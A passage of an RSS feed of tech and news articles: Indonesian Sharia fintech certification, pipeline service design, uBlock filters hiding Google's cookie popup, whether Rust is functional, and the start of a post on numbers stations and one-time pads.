<p>The supervisory board had other suggestions for LinkAja‚Äôs parallel Sharia platform, Djaenudin told <em>Rest of World</em>. The new version of the app embedded a <em>zakat </em>payment feature, <a href="https://www.islamic-relief.org.uk/about-us/what-we-do/zakat/">a form of religious tithing and worship</a> performed through charitable donations, customarily amounting to 2.5% of one‚Äôs total savings. After the board signed off on the feature, LinkAja partnered with 240 MUI-approved charitable institutions and 1,000 mosques nationwide <a href="https://news.detik.com/adv-nhl-detikcom/d-5019749/wahai-umat-muslim-ini-cara-mudah-berzakat-lewat-layanan-syariah-linkaja">to launch the zakat feature</a>. Months of vetting culminated in a full audit of LinkAja‚Äôs operations at its Jakarta headquarters by MUI.&nbsp;</p>



<p>According to Widjayanto, LinkAja paid a $300 (4 million rupiah) charge to MUI for its Sharia certificate, which lasts three years, including a $20 transportation fee for the auditor.&nbsp;</p>



<p>LinkAja Sharia Services <a href="https://www.idnfinancials.com/news/33503/link-aja-launches-linkaja-sharia-services">launched on April 14</a>, just one week before the start of Ramadan. In its first month, it saw 100,000 user registrations. Djaenudin credits the MUI Sharia certificate for this first wave of customers. Most Indonesians prefer to use a Sharia-branded service, even if few understand the particulars of riba or mudarabah, according to LinkAja market research. ‚ÄúFrom the customer‚Äôs perspective, as long as they see the halal logo or Sharia certificate from a trusted body, which is MUI, it gives them clearance and trust,‚Äù said Djaenudin.</p>



<p>For Indonesian fintech entrepreneurs hoping to establish their Sharia credentials, the MUI certificate has become the gold standard. Ronald Yusuf Wijaya, the founder of two Sharia-compliant crowdfunding startups, converted to Islam while building his business. ‚ÄúIt‚Äôs been almost nine years, and I‚Äôm learning all of this from the day I started my business,‚Äù he said. Wijaya is chairman of the <a href="https://fintechsyariah.id/en">Indonesian Sharia Fintech Association (AFSI)</a>, a trade association that lobbies on behalf of <a href="https://www.reuters.com/article/us-indonesia-digitalpayments-islam/sharia-fintech-startups-race-to-tap-indonesia-growth-by-aligning-with-islam-idUSKBN20Q0IA">this burgeoning pocket of the Indonesian economy</a>. Since converting, Wijaya has successfully navigated MUI Sharia certification with both his companies. ‚ÄúSome customers, they ask, ‚ÄòAre you certified, or are you just Sharia?‚Äô‚Äù&nbsp;</p>


		<figure>
			<div>
				<p><img src="https://149346090.v2.pressablecdn.com/wp-content/uploads/2020/09/LinkAja-zakat-payments-portal-1-e1599232688949-40x86.jpeg" data-src="https://149346090.v2.pressablecdn.com/wp-content/uploads/2020/09/LinkAja-zakat-payments-portal-1-e1599232688949-538x1066.jpeg" data-srcset="https://149346090.v2.pressablecdn.com/wp-content/uploads/2020/09/LinkAja-zakat-payments-portal-1-e1599232688949-400x857.jpeg 400w, " sizes="(max-width: 640px) 100vw, 300px" alt="">
					
				</p>
			</div>
						<figcaption itemprop="caption description">
				
				
			</figcaption>
		</figure>


<p>For most Sharia fintech startups, MUI certificates are not only commercially advantageous but legally required by the Financial Services Authority of Indonesia (OJK), the state financial regulator. Other areas of the Sharia digital economy, like <a href="https://www.salaamgateway.com/story/indonesian-e-commerce-giant-tokopedia-aiming-for-10-of-total-transactions-to-come-from-new-islamic-m">halal e-commerce</a> and <a href="https://www.salaamgateway.com/story/indonesia-gets-first-diy-umrah-platform-e-commerce-giant-starts-selling-pilgrimage-packages"><em>umrah </em>sites</a>, travel-booking platforms for Islamic pilgrimages, do not require this certificate.&nbsp;</p>



<p>Dr. Ir. H. Nadratuzzaman Hosen, vice chair of DSN MUI, told <em>Rest of World</em> that MUI is a passive actor in the development of new apps ‚Äî waiting idly for companies to seek its approval rather than imposing fatwas on companies as a theocratic ‚Ä¶</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://restofworld.org/2020/now-serving-halal-apps/">https://restofworld.org/2020/now-serving-halal-apps/</a></em></p>]]>
            </description>
            <link>https://restofworld.org/2020/now-serving-halal-apps/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24516141</guid>
            <pubDate>Fri, 18 Sep 2020 12:59:22 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Features of a proper pipeline service ‚Äì my improvement roadmap for CodePipeline]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24516099">thread link</a>) | @donkersgood
<br/>
September 18, 2020 | https://www.sentiatechblog.com/features-of-a-proper-pipeline-service | <a href="https://web.archive.org/web/*/https://www.sentiatechblog.com/features-of-a-proper-pipeline-service">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><!--## Features of a proper pipeline service-->
<p>I recently <a rel="noopener noreferrer" href="https://www.sentiatechblog.com/aws-needs-to-step-up-its-devops-game-and-a-few-other-takeaways-from-the-new">published a post</a> criticizing the state of developer tooling in AWS. Today I‚Äôll be more constructive and describe the features that encompass a proper pipeline service.</p>
<p>Please note: this article is about pipeline <em>services</em>, not a specific pipeline. In other words, we‚Äôll look at a tool used to create pipelines, not the pipeline itself.</p>
<p>A pipeline service should be versatile, allowing developers to create pipelines which deploy their applications and infrastructure in a way that works for them. A pipeline service should support multiple sources, be flexible in the number of build steps, allow for parallel builds, and so on.</p>
<p>In this article we‚Äôll explore a number of core features to support many different types of workflows. There are some references to AWS, but these principles are generic and should apply to any cloud or SaaS solution.</p>
<h3>Any Git repository, any authentication method</h3>
<p><img src="https://images.ctfassets.net/9gzi1io5uqx8/3xmbfK5AanPsQdN2gmfdZF/d3d10f9a05c2a8140e51f83177f38ab1/auth.png?fit=scale&amp;w=1330" alt="Git authentication methods"><br>
This might seem like an open door, but for some reason generic Git repositories are not supported in AWS CodePipeline. For a pipeline service to be successful, it should not require developers to host their application on a specific platform like GitHub. Instead, the pipeline service should support the raw Git implementation and allow developers to choose whether to use HTTPS, SSH with username and password, SSH with SSH keys, or OAuth deploy keys.</p>
<p>By supporting these options, the pipeline service offers maximum flexibility while allowing developers to utilize basic security measures like read-only deploy keys.</p>
<h3>Any branch, any commit</h3>
<p><img src="https://images.ctfassets.net/9gzi1io5uqx8/5nSt8Mfxf75F2iSWWlzJLt/8f5fd9da6c9e5ac396492faf93b5d6fa/any_commit.png?fit=scale&amp;w=1330" alt="Building any commit"><br>
Many pipelines services require a pipeline to be hardcoded to a specific branch; one pipeline which detects changes on the <code>develop</code> branch, then builds and deploys environment A, and a completely separate pipeline that detects changes on the <code>main</code> branch, then builds and deploys environment B. This might be fine 80% of the time, but it‚Äôs a real hassle in the other 20%.</p>
<p>A common example that does not work in this setup is a <code>hotfix</code> branch, typically used to branch from <code>main</code> to fix a high priority bug. In some cases, this fix is experimental - you do not know if it will resolve the issue. If your pipeline is ‚Äòstuck‚Äô on the <code>main</code> branch, you would need to merge this untested change to the <code>main</code> branch before deploying, which goes against Git principles.</p>
<p>Of course, an argument of ‚Äòno untested code should be deployed in production‚Äô can be made, but not all of us are Google, and some of us need to do deployments in the middle of the night without anybody available to do a code review.</p>
<p>Another use case for dynamic branch selection is deploying feature branches into an acceptance environment. There are use cases where the feature branch has been reviewed, but needs to be tested in a very specific context. Instead of merging the change before executing the test, developers should have the freedom and responsibility to deploy a feature branch to an acceptance environment, testing the feature, and merging the change after it has been verified.</p>
<p>Expanding on the ‚Äòany branch‚Äô feature, a pipeline should allow developers to deploy a specific commit, not just the HEAD of a branch. Maybe your developers have been working on a feature, but decide that they want to test an earlier version to compare the differences. The pipeline should not force users to use HEAD or require them to create a separate branch from a commit to be able to build older commits.</p>
<p>To support these use cases, a pipeline should be flexible in its branch selection, and a pipeline service should either allow a pipeline to be easily updated or, better yet, decouple the source, build and deploy steps altogether. More on that in the next chapter.</p>
<h3>Decoupled source, build and deploy steps</h3>
<p><img src="https://images.ctfassets.net/9gzi1io5uqx8/7KUR68soKqQg4viajidrbW/4ae3d06c8c0eb0775f7371187a6d2c1d/decoupled.png?fit=scale&amp;w=1330" alt="Decoupled source, build and deploy steps"><br>
To resolve the ‚Äòany branch, any commit‚Äô issue, a pipeline should offer an interface that displays all the branches, commits and tags in the repository, and allows developers to choose which commit to run the pipeline on. This means the source and build steps are decoupled. Instead of running the pipeline when a new commit is detected on a preconfigured branch (strictly coupling the source and the build step), the source repository‚Äôs metadata should synchronize independently, and choosing a commit should result in an artifact that is used as the initial step for the pipeline.</p>
<p>You might wonder how decoupling the source and build steps impacts automated testing and deployments. Clearly, we can‚Äôt run the full pipeline on every branch and every commit. We‚Äôll cover this problem in the ‚ÄòAutomated builds and releases‚Äô section later in this article.</p>
<p>Once a source commit has been chosen, it should be built. Optionally, this step can be skipped, instead moving the source artifact to the deploy step immediately. More on the build step follows in the next chapter.</p>
<p>At this point, either the source step has provided an artifact that‚Äôs ready to deploy, or the source artifact has been built by the build step, and <em>that</em> has resulted in a deployable artifact.</p>
<h4>Promoting builds</h4>
<p>To guarantee that the code running in production is exactly the same as the code that was tested in an acceptance environment, it should be possible to ‚Äòpromote‚Äô an artifact from acceptance to production. To achieve this, developers (or an automated system) should be able to choose where to deploy a build artifact - to a developer, test, sandbox, acceptance, production or any other environment.</p>
<p>This results in decoupled build and deploy steps, and the artifact is used to glue any build result to any deploy environment. Through this mechanism, any commit can result in an artifact which can first be deployed to acceptance, and then be deployed to production. This solution moves the responsibility for deploying the right commits to the different environments from the pipeline‚Äôs configuration to the engineers. With great power comes great responsibility - in other words: this allows engineers to **** **** up big time, for example by deploying an untested commit to production - but with the fine grained access control discussed in a later section, the pipeline maintainers will be able to manage who wields this power.</p>
<p><img src="https://images.ctfassets.net/9gzi1io5uqx8/5MWeOQDhfrVDVxsshn2nQ4/9e261a01faa8e731aec67cc51346b026/verify.png?fit=scale&amp;w=1330" alt="Verifying and promoting builds"></p>
<p>‚ÄúWait!‚Äù I hear you shout from the audience, ‚Äúdoesn‚Äôt that mean that all environments will be production sized?‚Äù. But no, this can be controlled through parameters. In other words, the deployment process ‚Äòknows‚Äô which environment it‚Äôs deploying to and will read the correct parameters for that environment, for example configuring t3.medium instances for acceptance and m5.xlarge instances for production.</p>
<h3>Build anything</h3>
<p>The build step described in the previous step is used to convert any source artifact to a deployable artifact. That might mean running unit tests, compiling files, compressing or packaging files, cleaning caches, generating CloudFormation templates, or anything in between. To support this, the build phase should be able to run about any kind of script or code, including Ruby, Python, Bash, .NET, NodeJS, Zip, Terraform, CDK, and so on. AWS CodeBuild is an awesome single-run container platform that is perfectly suited for this requirement.</p>
<h3>Rollbacks</h3>
<p><img src="https://images.ctfassets.net/9gzi1io5uqx8/Q8gGGfoxpCVGORKLuBJl3/ba889b281b6742e649af96775720b998/rollbacks.png?fit=scale&amp;w=1330" alt="Rollbacks"><br>
An essential feature for any pipeline is the support of rollbacks. Simply put: the pipeline should be able to revert back to a previous version of the environment in case any issues with the latest release are encountered. This can either be done automatically, for example when a test reports a failure, or manually, in case engineers or customers report an issue. This strongly relates to the next chapter: build and release history.</p>
<h3>Build and release history</h3>
<p>Because the source, build and deploy steps have been decoupled, releases are not guaranteed to match any Git branch‚Äôs chronology anymore. For example, the acceptance environment might have releases from a feature branch, the dev branch, and older feature branch and the main branch, in any order. Likewise, the last commit on the <code>main</code> branch (commit <code>N</code>) might be deployed to production, but commit <code>N - 1</code>, <code>N - 2</code> and <code>N - 3</code> might have not have been, making the previous release on production commit <code>N - 4</code>. Because of this, it is important to have an overview of every build and release in the environment, including build logs and audit trails.</p>
<p>When a release history for an environment is available, rollbacks can be implemented by including a ‚Äòredeploy this build‚Äô button for every build artifact.</p>
<h3>Fine-grained access control</h3>
<p><img src="https://images.ctfassets.net/9gzi1io5uqx8/6ejm6J4n82oCeUdImhLveq/43c560378aa8697801204ab071b67e13/access_control.png?fit=scale&amp;w=1330" alt="Access control"><br>
The pipelines created are inherently flexible and powerful, which means that any user with sufficient access can deploy any (potentially broken) feature to any environment. To mitigate this, the pipeline service should provide fine-grained access control, allowing specific users or groups to edit pipelines, build sources, and deploy to specific environments. When properly implemented, this allows some engineers to deploy only to their own environments, some to the acceptance environments, and only a small subset to be responsible for production releases.</p>
<h3>Automated builds and releases</h3>
<p>There are a number of cases in which automated builds or releases can be beneficial or necessary. Common situations are automatically building and testing any commit on the <code>develop</code> branch, or automatically deploying the HEAD of the <code>main</code> branch to acceptance.</p>
<p>Another common scenario is scheduled scaling, for example shutting down developer environments when they are not in use or automatically scaling down acceptance environments outside of office hours.</p>
<p>To provide solutions for both use cases, the pipeline service should allow specific branches or tags to be configured for automated releases; when a new commit on this branch or of this tag has been detected, the pipeline will automatically build that commit, generate a build artifact, and deploy this to the selected environment.</p>
<p><img src="https://images.ctfassets.net/9gzi1io5uqx8/5nOX2HIPLzxWnuupr6SiC0/3b64fdd0f8b5d61abeb675487e3aa272/automated_releases.png?fit=scale&amp;w=1330" alt="Automated releases"><br>
To achieve the scaling objective, a scheduled trigger should be able to select a source commit and to supply environmental variables to the build and deploy processes, for example <code>SCALE_DOWN = true</code>, so the deployment ‚Ä¶</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.sentiatechblog.com/features-of-a-proper-pipeline-service">https://www.sentiatechblog.com/features-of-a-proper-pipeline-service</a></em></p>]]>
            </description>
            <link>https://www.sentiatechblog.com/features-of-a-proper-pipeline-service</link>
            <guid isPermaLink="false">hacker-news-small-sites-24516099</guid>
            <pubDate>Fri, 18 Sep 2020 12:57:06 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Getting rid of the Google cookie consent popup]]>
            </title>
            <description>
<![CDATA[
Score 70 | Comments 65 (<a href="https://news.ycombinator.com/item?id=24515998">thread link</a>) | @edward
<br/>
September 18, 2020 | https://daniel-lange.com/archives/164-Getting-rid-of-the-Google-cookie-consent-popup.html | <a href="https://web.archive.org/web/*/https://daniel-lange.com/archives/164-Getting-rid-of-the-Google-cookie-consent-popup.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="page">
    
        <nav id="primary-nav">
        

        <ul><li><a href="https://daniel-lange.com/">Blog</a></li><li><a href="https://daniel-lange.com/pages/software.html">Software</a></li><li><a href="https://daniel-lange.com/pages/contact.html">Contact</a></li></ul>
    </nav>
        <div>
        <main id="content">
        
            <article id="post_164">
        <header>
            <h2><a href="https://daniel-lange.com/archives/164-Getting-rid-of-the-Google-cookie-consent-popup.html">Getting rid of the Google cookie consent popup</a></h2>

            
        </header>

        <div>
        <p><a href="https://daniel-lange.com/categories/18-Internet"><img title="Internet: Remember ... all I'm offering is the truth. Nothing more. (Morpheus to Neo who is choosing the red pill)" alt="Internet" src="https://daniel-lange.com/uploads/http.serendipityThumb.jpg"></a></p><p>If you clear your browser cookies regularly (as you should do), Google will annoy you with a full screen cookie consent overlay these days. And - of course - there is no "no tracking consent, technically required cookies only" button. You may log in to Google to set your preference. Yeah, I'm sure this is totally following the intent of the <a href="https://eur-lex.europa.eu/eli/dir/2009/136/2009-12-19">EU Directive 2009/136/EC</a> (the "cookie law").</p>

<p><!-- s9ymdb:664 --><img width="1332" height="1066" src="https://daniel-lange.com/uploads/entries/200918_Google_cookie_consent_screen.png" alt="Google cookie consent pop-up"></p>

<p>Unfortunately none of the big "anti-annoyances" filter lists seem to have picked that one up yet but the friendly folks from the <a href="https://www.computerbase.de/forum/threads/google-nervt-bevor-sie-fortfahren.1968809/">Computerbase Forum</a> [German] to the rescue. User "Sepp Depp" has created the following filter set that <abbr title="Works For Me">WFM</abbr>:</p>

<p>Add this to your <a href="https://github.com/gorhill/uBlock">uBlock Origin</a> "My filters" tab:</p>

<pre>! Google - remove cookie-consent-popup and restore scoll functionality
google.*##.wwYr3.aID8W.bErdLd
google.*##.aID8W.m114nf.t7xA6
google.*##div[jsname][jsaction^="dg_close"]
google.*##html:style(overflow: visible !important;)
google.*##.widget-consent-fullscreen.widget-consent
</pre>

                </div>
                
        

        <!--
        <rdf:RDF xmlns:rdf="http://www.w3.org/1999/02/22-rdf-syntax-ns#"
                 xmlns:trackback="http://madskills.com/public/xml/rss/module/trackback/"
                 xmlns:dc="http://purl.org/dc/elements/1.1/">
        <rdf:Description
                 rdf:about="https://daniel-lange.com/feeds/ei_164.rdf"
                 trackback:ping="https://daniel-lange.com/comment.php?type=trackback&amp;entry_id=164"
                 dc:title="Getting rid of the Google cookie consent popup"
                 dc:identifier="https://daniel-lange.com/archives/164-Getting-rid-of-the-Google-cookie-consent-popup.html" />
        </rdf:RDF>
        -->

                                            
        

        
            <a id="feedback"></a>
                        

        
    </article>
        



        </main>
                
        </div>

    
</div></div>]]>
            </description>
            <link>https://daniel-lange.com/archives/164-Getting-rid-of-the-Google-cookie-consent-popup.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-24515998</guid>
            <pubDate>Fri, 18 Sep 2020 12:48:39 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Is Rust a Functional Language in Disguise?]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24515759">thread link</a>) | @praveenperera
<br/>
September 18, 2020 | https://ceronman.com/2020/09/17/is-rust-a-functional-language-in-disguise/ | <a href="https://web.archive.org/web/*/https://ceronman.com/2020/09/17/is-rust-a-functional-language-in-disguise/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
		
<p>This is something I‚Äôve been asking myself while learning Rust. Yes, I know that this sounds like a weird question to ask as it‚Äôs no secret that Rust has huge influence from the functional programming world. Closures, iterators, pattern matching, algebraic data types; these are features inspired by FP languages, so obviously you can do functional programming with Rust. But that‚Äôs not really my question. What I‚Äôm asking is if Rust is a <strong>mainly</strong> functional language.</p>



<p>These days most mainstream imperative languages have functional features, you can do FP in any of them, but that doesn‚Äôt mean that those languages are considered functional. On the other hand, some languages are designed mainly to be functional, I‚Äôm talking about Haskell, Clojure, OCaml or Erlang. So, to be more clear, I can rephrase my question as: Is Rust a language designed to be used mainly for functional programming? Or is it another imperative language where you can optionally use FP?</p>



<p>At first glance, it looks like the answer is simple. Rust very much looks like an imperative language with support for some popular features from functional languages. But after a closer look at the language, I‚Äôve come to realize that it is closer to a purely functional language than I thought. It is <strong>a functional language disguised as imperative</strong>. I will try to explain what I mean in this post.</p>



<h2>What is functional programming?</h2>



<p>Before explaining why I think that Rust is mainly a functional language, it is a good idea to first explain what functional programming is. This is not as easy as it sounds, so first a disclaimer: This is far from a formal definition, but rather a hand-wavy explanation of what I understand as FP.</p>



<p><em>Side note: I am making this disclaimer because in the past I‚Äôve experienced some quite angry responses from FP enthusiasts about this point of view. That made me quit FP for a while until I found the very friendly Clojure community. And I‚Äôm happy to report that in my first steps with Rust so far I have met an equally friendly community.</em></p>



<p>The core ideas behind Functional Programming are immutability and lack of side effects. That‚Äôs it. If you mostly use pure functions that receive data and return data without mutating any sort of external state, then you‚Äôre doing FP. On the other hand, if you mostly call functions or methods that alter or mutate some external state, then you are doing imperative programming.</p>



<p>To avoid side effects, functional languages use immutable data structures. Let‚Äôs jump to some small code examples to illustrate this difference. I know these examples are a bit silly and there are other ways to write them, but I just want a simple code example to illustrate my point. Here is how you use a hash map (dictionary) in Python, which is a mainly imperative language:</p>


<div>
<pre>film = {}
film[<span>"title"</span>] = <span>"Fargo"</span>
film[<span>"director"</span>] = <span>"Joel Coen"</span>
</pre>
</div>


<p>And here is how you use a hash map in Clojure, a mainly functional language:</p>


<div>
<pre>(<span>let </span>[film1 {}
      film2 (assoc film1 <span>"title"</span> <span>"Fargo"</span>)
      film3 (assoc film2 <span>"director"</span> <span>"Joel Coen"</span>)])
</pre>
</div>


<p>The main difference between these two approaches is that in Python you create one map, then you mutate it to add some entries to it. In Clojure you can‚Äôt mutate the map, instead, what you can do is to create a new map based on the previous one.</p>



<p>Now, let‚Äôs check how the same thing looks in Rust:</p>


<div>
<pre><span>let</span> <span>mut</span> film = HashMap::new();
film.insert(<span>"title"</span>, <span>"fargo"</span>);
film.insert(<span>"director"</span>, <span>"Joel Coen"</span>);
</pre>
</div>


<p>The Rust example is much closer to the imperative Python than the functional Clojure. And just in case there is any doubt, we have the <strong>mut</strong> keyword right there, which means <strong>mutable</strong>.</p>



<p><em>Side note: Unlike some other languages that also have keywords to distinguish mutable and immutable values (<strong>final</strong> in java, <strong>const</strong> in JavaScript, <strong>readonly</strong> in C#, <strong>val</strong> in Kotlin), one interesting thing about Rust is that this applies to the whole value, not just the superficial reference. In Java, nothing prevents you from mutating a HashMap in a final reference. Rust won‚Äôt allow any sort of mutation unless you use <strong>mut</strong> (I‚Äôm going to conveniently ignore Interior Mutability for now, mostly because I think I don‚Äôt fully understand it yet).</em></p>



<p>So after looking at the code examples, we can conclude that Rust is mainly an imperative language. Or is it? I know that this sounds very counter intuitive, but I think that the Rust example is actually closer to the functional style than the imperative one. Yes, I‚Äôll explain why at some point, please be patient.</p>



<h2>If a tree falls in the woods, does it make a sound?</h2>



<p>Here is the thing, pure Functional Programming is an illusion, it‚Äôs not real. Even the purest of the FP languages are mutating things and producing some side effects behind the scenes. Real computers are imperative machines. Your pure functions have to change registries, push stack frames, etc. So we can say that FP languages are merely an emulation, they are not&nbsp; the real thing. This doesn‚Äôt mean that FP doesn‚Äôt have any value, I actually think there is a lot of value in it. Especially in the fact that FP produces programs that are easier to understand and to maintain. But it‚Äôs important to understand that purity is unachievable.</p>



<p>Let‚Äôs take another look at my previous Clojure code example:</p>


<div>
<pre>(<span>let </span>[film1 {}
      film2 (assoc film1 <span>"title"</span> <span>"Fargo"</span>)
      film3 (assoc film2 <span>"director"</span> <span>"Joel Coen"</span>)])
</pre>
</div>


<p>Here Clojure doesn‚Äôt really create entirely new data structures on every operation. That would be very inefficient. Instead, Clojure internally uses something called <a href="http://lampwww.epfl.ch/papers/idealhashtrees.pdf">Hash Array Mapped Tries (HAMT)</a>. When you use <strong>assoc</strong> in Clojure to add an entry to a map, it looks like it‚Äôs generating a completely new map, but in reality, both maps share most of the same internal structure, they are really one single HAMT, and <strong>assoc</strong> is actually mutating that HAMT.</p>



<p>So data structures in Clojure are actually mutable, but that doesn‚Äôt really matter because their interface is side effect free for the external world. Clojure is still a mainly functional language. And that‚Äôs a key aspect of FP; it‚Äôs not about completely avoiding mutation, that is impossible in real computers, it‚Äôs about hiding those mutations in a way that they don‚Äôt create side effects for the rest of the code. In FP we want our units of computation (functions) to depend only on their inputs and not on some external state. That‚Äôs what makes them easier to reason about.</p>



<p>Now back to our small Python example:</p>


<div>
<pre>film[<span>"title"</span>] = <span>"Fargo"</span>
film[<span>"director"</span>] = <span>"Joel Coen"</span>
</pre>
</div>


<p>The key difference here, compared to the Clojure example, is that the world is not shielded from this mutation. We could have some class or other part of the code holding a reference to this map, and as soon as we mutate this we are creating a side effect for those parts of the code. This makes code harder to reason about. It‚Äôs the same reason why global variables are considered a bad practice, and it‚Äôs also the reason why many programmers prefer to use FP.</p>



<p>Let‚Äôs go back to the Rust example. This time I added a reference to the map, which will be the observer of the mutation side effect:</p>


<div>
<pre><span>let</span> <span>mut</span> film = HashMap::new();
<span>let</span> observer = &amp;film;
film.insert(<span>"title"</span>, <span>"fargo"</span>);
film.insert(<span>"director"</span>, <span>"Joel Coen"</span>);
println!(<span>"{}"</span>, observer.len());
</pre>
</div>


<p>If you are a Rust programmer you of course know that <strong>this code won‚Äôt compile</strong>. Here is what the awesome Rust compiler says about it:</p>


<div>
<pre>error[E0502]: cannot borrow `film` as mutable because it is also borrowed as immutable
 --&gt; src/main.rs:6:5
  |
5 |     let observer = &amp;film;
  |                    ----- immutable borrow occurs here
6 |     film.insert("title", "fargo");
  |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^ mutable borrow occurs here
7 |     film.insert("director", "Joel Coen");
8 |     println!("{}", observer.len());
  |                    -------- immutable borrow later used here
</pre>
</div>


<p>This error happens because Rust‚Äôs ownership and borrowing rules only allow either one single mutable reference or many immutable ones. In other words,<strong> if you are going to mutate an object in Rust, you can‚Äôt have any other part of the code holding a reference to that object</strong>. This is mostly checked statically by the compiler. So mutation in Rust is like a tree falling in the forest where there is no one to hear it. It‚Äôs a mutation that doesn‚Äôt produce side effects. And this is exactly what FP is about.</p>



<h2>The struggles of learning a language</h2>



<p>Rust has not been as easy to learn for me as other languages. The borrow checker, which is the part that verifies the mutability and lifetime of references, is famous among Rust beginners as the toughest part to get used to.</p>



<p>While struggling with the borrow checker I started to notice something: the kinds of patterns that caused me trouble with the borrow checker are very similar to the ones that caused me trouble when learning functional programming. For example, when I was learning Clojure by solving some <a href="https://adventofcode.com/">Advent of Code</a> problems, I got to a problem where the best solution was to use a circularly linked list. I was trying to solve the problems using pure FP and I quickly hit a wall. Later on, when I needed a similar data structure in Rust I also hit a wall. This kind of data structures are hard to implement both in pure FP and in Rust.</p>



<p><em>Side note: There is a fantastic tutorial called <a href="https://rust-unofficial.github.io/too-many-lists/">Learning Rust with Entirely Too Many Linked Lists</a>, by Alexis Beingessner. It‚Äôs a great resource for learning to deal with the borrow checker in a practical way. This has been a lifesaver!</em></p>



<p>The similarity in the struggles is what made me think that perhaps Rust is way more functional than it appears to be and that approaching Rust in an imperative way is only a sure path to borrow checker headaches. But this is hard to realize because Rust does look very imperative, so your intuition is to use it in that way.</p>



<p>There is one huge positive aspect of this imperative appearance though: It‚Äôs much easier to reason about performance. Once you pass the borrow ‚Ä¶</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://ceronman.com/2020/09/17/is-rust-a-functional-language-in-disguise/">https://ceronman.com/2020/09/17/is-rust-a-functional-language-in-disguise/</a></em></p>]]>
            </description>
            <link>https://ceronman.com/2020/09/17/is-rust-a-functional-language-in-disguise/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24515759</guid>
            <pubDate>Fri, 18 Sep 2020 12:23:19 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Did a broken random number generator in Cuba help expose a Russian spy network?]]>
            </title>
            <description>
<![CDATA[
Score 24 | Comments 1 (<a href="https://news.ycombinator.com/item?id=24515717">thread link</a>) | @privong
<br/>
September 18, 2020 | https://www.mattblaze.org/blog/neinnines/ | <a href="https://web.archive.org/web/*/https://www.mattblaze.org/blog/neinnines/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="center"><div>
		<p>18 September 2020</p><p>A Cryptologic Mystery</p>
	<p>Did a broken random number generator in Cuba help expose a Russian espionage network?</p>




	
<p>
I picked up the new book <em>Compromised</em> last week and was intrigued to discover that it may have shed some light on a small (and rather esoteric) cryptologic and espionage mystery that I've been puzzling over for about 15 years. <em>Compromised</em> is primarily a memoir of former FBI counterintelligence agent Peter Strzok's investigation into Russian operations in the lead up to the 2016 presidential election, but this post is not a review of the book or concerned with that aspect of it.
</p><p>
Early in the book, as an almost throwaway bit of background color, Strzok discusses his work in Boston investigating the famous Russian "illegals" espionage network from 2000 until their arrest (and subsequent exchange with Russia) in 2010. "Illegals" are foreign agents operating abroad under false identities and without official or diplomatic cover. In this case, ten Russian illegals were living and working in the US under false Canadian and American identities. (The case inspired the recent TV series <em>The Americans</em>.)
</p><p>
Strzok was the case agent responsible for two of the suspects, Andrey Bezrukov and Elena Vavilova (posing as a Canadian couple under the aliases Donald Heathfield and Tracey Lee Ann Foley). The author recounts watching from the street on Thursday evenings as Vavilova received encrypted shortwave "numbers" transmissions in their Cambridge, MA apartment.
</p><p>
Given that Bezrukov and Vaviloa were indeed, as the FBI suspected, Russian spies, it's not surprising that they were sent messages from headquarters using this method; numbers stations are part of time-honored espionage tradecraft for communicating with covert agents. But their capture may have illustrated how subtle errors can cause these systems to fail badly in practice, even when the cryptography itself is sound.
<br>
<a name="fold">&nbsp;</a></p><hr size="1"><p>
	

First, a bit of background. For at least the last sixty years, encrypted shortwave radio transmissions have been a standard method for sending messages to covert spies abroad. Shortwave radio has several attractive properties here. It covers long distances; it's possible for a single transmitter to get hemispheric or even global coverage. Shortwave radio receivers, while less common than they once were, are readily available commercially in almost every country and are not usually suspicious or alerting to possess. And while it's relatively easy to tell where a shortwave signal is coming from, their wide coverage area makes it very difficult to infer exactly who or where the intended recipients might be. Both the US (and its allies) and the Soviet Union (and its satellites) made extensive use of shortwave radio for communicating with spies during the cold war, and enigmatic "numbers" transmissions aimed at spies continue to this day.
</p><p>
The encryption method of choice used by numbers stations is called a "one time pad" (OTP) cipher. OTPs have unique advantages over other encryption methods. Used properly, they are <em>unconditionally</em> secure; no amount of computing power or ingenuity can "break" them without knowledge of the secret key. Also, they are almost deceptively low tech. It is possible to encrypt and decrypt OTP messages by hand with nothing more than paper and pencil and simple arithmetic. The disadvantage is that OTPs are cumbersome; you need a secret key as long as all the messages you will ever send, with no part of the key ever re-used for multiple messages. Typically, the key would be printed as a series of digits bound into a pad of paper, with each page removed after use; hence the name "one time pad". OTPs can be difficult in practice to use properly and are quite vulnerable if used improperly; more on that later.
</p><p>
The OTP messages sent to spies by shortwave radio typically consist of decimal digits broadcast in either a mechanically recorded voice or in morse code (more recently, digital transmissions are also used) on designated frequencies at designated times, usually in four or five digit groups (hence the term "numbers station"). After copying and verifying a header in the message, the agent would remove the corresponding page from their secret OTP codebook and add each key digit to each corresponding message digit using modulo-10 arithmetic (without carry). The resulting "plaintext" digits are then converted to text with a simple substitution encoding (e.g, A=01, B=02, etc., although other encodings are generally used). That's all there is to it. The security of the system depends entirely on the uniqueness and secrecy of the OTP codebook pad given to each agent.
</p><p>
To prevent "traffic analysis" that might reveal to an observer the number of active agents or the volume of messages sent to them, numbers stations typically operate on rigidly fixed schedules, sending messages at pre-determined times whether there is actually a message to be sent or not. When there is no traffic for a given timeslot, random dummy "fill" traffic is sent instead. The fill traffic should be indistinguishable to an outsider from real messages, thereby leaking nothing about how often or when the true messages are being sent. But more on this later.
</p><p>
